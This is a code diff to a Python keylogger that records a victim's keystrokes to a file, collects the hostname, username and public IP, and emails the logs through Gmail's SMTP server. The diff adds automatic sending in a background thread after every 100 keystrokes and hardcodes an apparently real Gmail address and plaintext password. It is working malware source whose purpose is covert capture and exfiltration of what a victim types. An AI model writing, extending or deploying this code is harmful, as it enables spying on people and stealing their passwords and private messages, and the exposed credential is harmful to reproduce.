@@ -1,4 +1,5 @@
 import logging
+import threading
 import smtplib
 import socket
 import urllib.request
@@ -20,11 +21,12 @@ logging.basicConfig(filename = "py-keylogger.log", level = logging.INFO,
 logger = logging.getLogger()
 
 EXIT_COMBINATION = {Key.ctrl_l, Key.f12}        # Press [L CTRL] + [F12] to stop keylogger
+EMAIL_INTERVAL = 100                            # Specify the amount of characters the victim needs to input before email is sent
 PORT = 465                                      # Specify port number (465 or 587 recommended)
 SMTP_SERVER = "smtp.gmail.com"                  # Specify SMTP server
-TO_ADDR = "user@domain.com"                     # Specify recipient email address
-FROM_ADDR = "user@domain.com"                   # Specify sender email address
-PASSWORD = "your_password"                      # Specify sender email account password
+TO_ADDR = "mail.smtpy@gmail.com"                # Specify recipient email address
+FROM_ADDR = "mail.smtpy@gmail.com"              # Specify sender email address
+PASSWORD = "PythonMail1!"                       # Enter sender email account password
 HOSTNAME = socket.gethostname()
 USER = os.getlogin()
 FILE_NAME = basename(sys.argv[0].split("\\")[-1])
@@ -37,7 +39,6 @@ except urllib.error.URLError:
     internet_conn = False
     PUBLIC_IP = None
     logger.warning("https://ident.me could not be reached")
-    
 # Specify email body
 CONTENT = '''
 See keylogs.txt attached.
@@ -45,6 +46,8 @@ See keylogs.txt attached.
 Sent from {}.'''.format(PUBLIC_IP)
 
 active_keys = set()
+keys_pressed = 0
+
 # Record keystrokes in keylogs.txt
 def log(text):
     with open("keylogs.txt", "a") as f:
@@ -120,7 +123,10 @@ def on_press(key):
         if all(k in active_keys for k in EXIT_COMBINATION):
             listener.stop()
             logger.info("[KEYLOGGER STOP]")
-
+            
+    global keys_pressed
+    keys_pressed += 1
+    
     try:
         log(key.char)
     except AttributeError:
@@ -136,8 +142,12 @@ def on_press(key):
             log(" ")
         else:
             log("\n" + str(key) + "\n")
-
-
+    
+    if keys_pressed % EMAIL_INTERVAL == 0:
+        logger.info("Interval reached")
+        t =  threading.Thread(target = send_email)
+        t.start()
+    
 def on_release(key):
     pass
 
